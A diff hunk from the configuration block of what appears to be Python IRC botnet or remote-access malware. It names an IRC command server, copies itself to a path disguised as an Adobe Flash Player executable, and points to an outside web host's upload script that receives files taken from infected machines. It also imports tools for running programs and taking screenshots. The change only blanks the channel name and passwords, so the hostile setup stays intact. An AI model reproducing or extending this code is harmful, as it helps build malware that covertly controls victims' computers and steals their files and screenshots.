@@ -18,10 +18,10 @@ import subprocess # For function run(): to execute program
 import time, datetime# For function screenshot():
 
 ircServer= "chat.freenode.net"	# Address Server Irc
-ircChanne= "#amarula424217"			# Channel for Bot connect
-ircPwdCha= "zombieland"					# Password of Channel, if there enter the password or leave blank
+ircChanne= " "			# Channel for Bot connect
+ircPwdCha= " "					# Password of Channel, if there enter the password or leave blank
 botAdmi= "Papa Father"				# A name for the welcome help, Not obligatory.
-botPass= "raise"				# Not obligatory. A name for the welcome help
+botPass= " "				# Not obligatory. A name for the welcome help
 dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"	# Path to where the bot will copy + name it, Use \ double to separate directories: \\
 urlFromUpload = "https://cardinal-restaurant.000webhostapp.com/upload.php"		# URL that contains the php ARRAY to receive files via upload
 urlFromUpShow = urlFromUpload.strip('http:upload.php')		# Variable that receives the URL to display uploaded files
